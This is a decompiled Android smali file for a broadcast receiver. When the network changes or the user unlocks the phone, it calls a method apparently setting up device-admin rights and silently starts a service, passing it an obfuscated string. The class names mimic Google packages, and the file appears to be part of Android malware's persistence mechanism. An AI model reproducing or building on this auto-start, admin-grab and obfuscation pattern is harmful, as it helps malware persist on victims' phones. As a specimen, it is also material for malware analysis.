.class public Lcom/wzz/wzz/IReiceiv;
.super Landroid/content/BroadcastReceiver;
.source "IReiceiv.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 12
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v4, 0x3

    .line 16
    const-string v2, "JULY"

    const-string v3, "OPEN SELEF----FROM--ONRECEIVE-----------------"

    invoke-static {v2, v3}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 17
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 18
    .local v0, "action":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    .line 19
    const-string v2, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 20
    const-string v2, "android.intent.action.USER_PRESENT"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 21
    :cond_0
    invoke-static {p1}, Lcom/attached/TengxunSb;->setAdrm(Landroid/content/Context;)V

    .line 22
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/wzz/wzz/QieSb;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 23
    .local v1, "in":Landroid/content/Intent;
    sget-boolean v2, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v2, :cond_1

    .line 24
    const-string v2, "JULY"

    const-string v3, "OPEN SELEF------onReceive-----------------"

    invoke-static {v2, v3}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 27
    :cond_1
    const-string v2, "what"

    new-array v3, v4, [I

    fill-array-data v3, :array_0

    invoke-static {v3}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 28
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 42
    .end local v1    # "in":Landroid/content/Intent;
    :cond_2
    :goto_0
    return-void

    .line 32
    :cond_3
    :try_start_0
    invoke-static {p1}, Lcom/attached/TengxunSb;->setAdrm(Landroid/content/Context;)V

    .line 33
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/wzz/wzz/QieSb;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 34
    .restart local v1    # "in":Landroid/content/Intent;
    sget-boolean v2, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v2, :cond_4

    .line 35
    const-string v2, "JULY"

    const-string v3, "OPEN SELEF------onReceive-----------------"

    invoke-static {v2, v3}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 37
    :cond_4
    const-string v2, "what"

    const/4 v3, 0x3

    new-array v3, v3, [I

    fill-array-data v3, :array_1

    invoke-static {v3}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 38
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 39
    .end local v1    # "in":Landroid/content/Intent;
    :catch_0
    move-exception v2

    goto :goto_0

    .line 27
    nop

    :array_0
    .array-data 4
        0x1a
        0x1d
        0x2f
    .end array-data

    .line 37
    :array_1
    .array-data 4
        0x1a
        0x1d
        0x2f
    .end array-data
.end method
